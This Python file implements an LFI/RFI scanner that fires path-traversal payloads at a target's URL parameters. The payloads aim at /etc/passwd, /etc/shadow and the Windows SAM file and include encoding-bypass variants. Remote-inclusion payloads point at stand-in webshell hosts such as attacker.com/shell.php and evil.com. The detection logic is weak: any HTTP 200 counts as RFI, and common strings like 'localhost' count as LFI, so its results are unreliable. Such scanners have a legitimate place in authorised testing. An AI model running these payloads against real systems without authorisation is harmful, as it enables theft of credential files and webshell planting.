#!/usr/bin/env python3
"""
Local File Inclusion (LFI) and Remote File Inclusion (RFI) Scanner

Detects LFI and RFI vulnerabilities through:
- Multiple LFI payloads (unix/windows paths)
- RFI payloads with various remote URLs
- Content signature detection
- Response code analysis
- Encoding bypass techniques

Vulnerable parameters: file, path, include, page, load, url, redirect, etc.

Author: Plascoy Security
Version: 2.0
"""

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from colorama import Fore, Style, init
from typing import Dict, List, Optional, Tuple
import time
import logging
import re

init(autoreset=True)

# Configure logging
logging.basicConfig(level=logging.INFO,
                   format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


class LFIRFIScanner:
    """Professional LFI/RFI vulnerability scanner"""
    
    # LFI payloads for different file systems
    LFI_PAYLOADS = {
        'unix_passwd': [
            '../../../etc/passwd',
            '../../etc/passwd',
            '../etc/passwd',
            '....//....//....//etc/passwd',
            '..%252f..%252f..%252fetc%252fpasswd',
            '..%c0%af..%c0%afetc%c0%afpasswd',
            '..%c0%ae..%c0%aeetc%c0%aepasswd',
        ],
        'unix_shadow': [
            '../../../etc/shadow',
            '../../etc/shadow',
            '../etc/shadow',
        ],
        'unix_config': [
            '../../../etc/hosts',
            '../../etc/hosts',
            '../etc/hosts',
        ],
        'windows_hosts': [
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '...\\windows\\system32\\drivers\\etc\\hosts',
            'C:\\windows\\system32\\drivers\\etc\\hosts',
        ],
        'windows_boot': [
            '..\\..\\..\\windows\\system32\\config\\sam',
            '..\\..\\..\\windows\\win.ini',
        ],
    }
    
    # RFI payloads
    RFI_PAYLOADS = [
        'http://attacker.com/shell.php',
        'https://pastebin.com/raw/shell',
        'http://evil.com/webshell.txt',
        'ftp://ftp.evil.com/shell.php',
        'php://filter/convert.base64-encode/resource=index.php',
    ]
    
    # Parameter names to test
    PARAM_NAMES = [
        'file', 'path', 'include', 'page', 'load', 'url', 'redirect',
        'file_path', 'filepath', 'document', 'doc', 'input', 'resource',
        'config', 'filename', 'view', 'display', 'open', 'read',
    ]
    
    # Signatures indicating file inclusion
    LFI_SIGNATURES = {
        'root:': 'Unix passwd file',
        'nobody:': 'Unix passwd file',
        'bin:': 'Unix passwd file',
        '[boot loader]': 'Windows boot.ini',
        '[extensions]': 'Windows ini file',
        '127.0.0.1': 'Hosts file',
        'localhost': 'Hosts file',
    }
    
    def __init__(self, target: str, timeout: int = 10, verify_ssl: bool = False):
        """Initialize LFI/RFI scanner"""
        self.target = self._normalize_target(target)
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.results = {
            'lfi_vulnerabilities': [],
            'rfi_vulnerabilities': [],
            'total_tested': 0,
            'scan_time': 0,
        }
        self.session = self._create_session()
    
    def _normalize_target(self, target: str) -> str:
        """Normalize target URL"""
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        return target.rstrip('/')
    
    def _create_session(self) -> requests.Session:
        """Create robust requests session"""
        session = requests.Session()
        
        retry_strategy = Retry(
            total=1,
            backoff_factor=0.5,
            status_forcelist=[429, 500, 502, 503, 504]
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })
        session.verify = self.verify_ssl
        
        return session
    
    def scan(self, verbose: bool = False) -> Dict:
        """
        Perform LFI/RFI vulnerability scan
        
        Args:
            verbose: Enable verbose output
            
        Returns:
            Dictionary with scan results
        """
        print(Fore.CYAN + Style.BRIGHT + "\n[*] LFI/RFI Scan Starting...")
        print(Fore.CYAN + f"[*] Target: {self.target}")
        
        start_time = time.time()
        
        # Test LFI vulnerabilities
        self._test_lfi(verbose)
        
        # Test RFI vulnerabilities
        self._test_rfi(verbose)
        
        self.results['scan_time'] = time.time() - start_time
        self._print_summary()
        
        return self.results
    
    def _test_lfi(self, verbose: bool = False):
        """Test for LFI vulnerabilities"""
        print(Fore.BLUE + "\n[*] Testing LFI vulnerabilities...")
        
        for payload_category, payloads in self.LFI_PAYLOADS.items():
            for param in self.PARAM_NAMES:
                for payload in payloads:
                    self.results['total_tested'] += 1
                    try:
                        url = f"{self.target.rstrip('/')}?{param}={payload}"
                        response = self.session.get(url, timeout=self.timeout)
                        
                        # Check for LFI signatures
                        for signature, sig_type in self.LFI_SIGNATURES.items():
                            if signature.lower() in response.text.lower():
                                vuln_info = {
                                    'url': url,
                                    'parameter': param,
                                    'payload': payload,
                                    'signature': sig_type,
                                    'status_code': response.status_code,
                                }
                                self.results['lfi_vulnerabilities'].append(vuln_info)
                                print(Fore.RED + f"[!] LFI FOUND: {param} - {sig_type}")
                                if verbose:
                                    print(Fore.YELLOW + f"    URL: {url}")
                                break
                    
                    except Exception as e:
                        if verbose:
                            logger.debug(f"Error testing {url}: {str(e)}")
    
    def _test_rfi(self, verbose: bool = False):
        """Test for RFI vulnerabilities"""
        print(Fore.BLUE + "\n[*] Testing RFI vulnerabilities...")
        
        for param in self.PARAM_NAMES:
            for payload in self.RFI_PAYLOADS:
                self.results['total_tested'] += 1
                try:
                    url = f"{self.target.rstrip('/')}?{param}={payload}"
                    response = self.session.get(url, timeout=self.timeout)
                    
                    # Check for RFI indicators
                    if response.status_code == 200 or 'shell' in response.text.lower():
                        vuln_info = {
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'status_code': response.status_code,
                        }
                        self.results['rfi_vulnerabilities'].append(vuln_info)
                        print(Fore.RED + f"[!] RFI FOUND: {param}")
                        if verbose:
                            print(Fore.YELLOW + f"    URL: {url}")
                
                except Exception as e:
                    if verbose:
                        logger.debug(f"Error testing {url}: {str(e)}")
    
    def _print_summary(self):
        """Print scan summary"""
        print(Fore.CYAN + "\n[*] LFI/RFI Scan Summary:")
        print(Fore.BLUE + f"[*] Total Tests: {self.results['total_tested']}")
        print(Fore.RED + f"[*] LFI Vulnerabilities: {len(self.results['lfi_vulnerabilities'])}")
        print(Fore.RED + f"[*] RFI Vulnerabilities: {len(self.results['rfi_vulnerabilities'])}")
        print(Fore.CYAN + f"[*] Scan Time: {self.results['scan_time']:.2f}s")


def lfi_rfi_scan(target: str, verbose: bool = False) -> Dict:
    """
    Wrapper function for LFI/RFI scanning
    
    Args:
        target: Target URL
        verbose: Enable verbose output
        
    Returns:
        Dictionary with scan results
    """
    scanner = LFIRFIScanner(target)
    return scanner.scan(verbose)